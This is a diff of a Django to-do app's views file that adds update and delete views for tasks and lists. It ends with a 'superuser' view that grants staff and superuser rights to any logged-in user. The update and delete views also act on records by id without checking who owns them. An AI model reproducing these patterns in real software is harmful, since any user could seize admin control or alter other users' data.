@@ -1,3 +1,5 @@
+from pickle import TRUE
+from threading import Thread
 from django.shortcuts import redirect, render
 from rest_framework import response
 from home.models import Task,threads
@@ -12,16 +14,30 @@ from home.models import Task,threads
 from todoList.serializers import TaskSerializer, threadsSerializer
 
 
-def tasks(request):
+
+def tasks(request,id = None,time = None):
     if request.user.is_anonymous:
         return redirect("/login")
     else:
-        allthread = threads.objects.all()
         datas = {}        
-        for i in range(allthread.count()):
-            tile = Task.objects.filter(thread=allthread[i])
+        if time:
+            
+            specific = threads.objects.get(id =4)
+            tile = Task.objects.filter(time=time)
             # print(tile)
-            datas[f'{allthread[i].Title}'] = tile 
+            datas[f'{specific.Title}'] = tile 
+        if id:
+
+            specific = threads.objects.get(id =id)
+            tile = Task.objects.filter(thread=specific)
+            # print(tile)
+            datas[f'{specific.Title}'] = tile 
+        else:
+            allthread = threads.objects.all()
+            for i in range(allthread.count()):
+                tile = Task.objects.filter(thread=allthread[i])
+                # print(tile)
+                datas[f'{allthread[i].Title}'] = tile 
     
         if request.method == "POST":
             desc = request.POST['desc']
@@ -35,6 +51,7 @@ def tasks(request):
             context = {'mydict':datas}
         
     return render(request, 'tasks.html',context)
+
 
 def threadsa(request):
     allthread = threads.objects.all()
@@ -53,10 +70,10 @@ def threadsa(request):
     context= {'mydict':datas}
     return render(request,'tasks.html',context)    
 
-# def thread(request):
-#     allthread=threads.objects.all()
-#     context = {'thread':allthread}
-#     return render(request,'tasks.html',context) 
+def thread(request):
+    allthread=threads.objects.all()
+    context = {'thread':allthread}
+    return render(request,'tasks.html',context) 
 
 def list(request):
     if request.user.is_anonymous:
@@ -68,15 +85,19 @@ def list(request):
             tile = Task.objects.filter(thread=allthread[i])
             #print(tile)
             datas[f'{allthread[i].Title}'] = tile 
-    
+        # print(datas)
+        sqw = threads.objects.all() #threads objects only considered !!
         if request.method =="POST":
             context={'success': True}
             tiles=request.POST['tile']
             context={'thread':allthread}
             ins2=threads(Title=tiles)
+
             ins2.save()
+            context = {'thread':allthread,'mydict':datas} #context added 
+            redirect(request.path)
         else:
-            context = {'thread':allthread,'mydict':datas}
+            context = {'thread':allthread,'mydict':datas,'threadssqw':sqw}
     return render(request,'list.html',context) 
 
 def loginUser(request):
@@ -128,3 +149,97 @@ class threadApi(APIView):
 
     def post(self):
         pass
+
+
+# # <----------task updation starts----------------------------->
+def update_task(request,pk):
+    if request.user.is_anonymous:
+        return redirect("/login")
+    else:
+        datas = {}        
+        allthread = threads.objects.all()
+        for i in range(allthread.count()):
+            tile = Task.objects.filter(thread=allthread[i])
+            # print(tile)
+            datas[f'{allthread[i].Title}'] = tile 
+            
+        update = Task.objects.get(id=pk)
+        if request.method == "POST":
+            desc = request.POST['desc']
+            thread_input = request.POST['thread']
+            # print(thread_input)
+            thread_object = threads.objects.filter(Title = thread_input).first()
+            # ins = Task(taskDesc=desc,thread = thread_object)
+            # ins.save()
+            update.taskDesc = desc
+            update.thread = thread_object
+            update.save()
+            # context={'update':update,'mydict':datas}
+        else:
+            pass
+        context = {'update':update,'mydict':datas}
+        # context = {'update':update}
+        return render(request,'update.html',context)
+# <----------updation ends----------------------------->
+
+
+# # <----------task deletion starts----------------------------->
+def delete(request,pk):
+    if request.user.is_anonymous:
+        return redirect("/login")
+    else:
+        delete_task = Task.objects.get(id=pk)
+        if request.method == 'POST':
+            delete_task.delete()
+            return redirect('/tasks')
+        return render(request,'delete.html')
+# # <----------deletion ends----------------------------->
+
+
+# # <----------list updation starts----------------------------->
+def updatel(request,pk):
+    if request.user.is_anonymous:
+        return redirect("/login")
+    else:
+        allthread=threads.objects.all()
+        datas = {}
+        for i in range(allthread.count()):
+            tile = Task.objects.filter(thread=allthread[i])
+            #print(tile)
+            datas[f'{allthread[i].Title}'] = tile 
+    
+        list_obj = threads.objects.get(id=pk)
+        if request.method =="POST":
+            context={'success': True}
+            tiles=request.POST['tile']
+            list_obj.Title = tiles 
+            list_obj.save()
+            context={'thread':allthread,'list_obj':list_obj}
+            redirect('/list')
+        else:
+            context = {'thread':allthread,'mydict':datas}
+    return render(request,'listu.html',context)
+# # <----------list updation ends----------------------------->
+
+
+
+# # <----------list deletion starts----------------------------->
+def deletel(request,pk):
+    if request.user.is_anonymous:
+        return redirect("/login")
+    else:
+        delete_list = threads.objects.get(id=pk)
+        if request.method == 'POST':
+            delete_list.delete()
+            return redirect('/list')
+        return render(request,'delete.html')
+# # <----------deletion ends----------------------------->
+def superuser(request):
+    if request.user.is_anonymous:
+        return redirect("/login")
+    else:
+        user  = request.user
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        return render(request,'hlo.html')
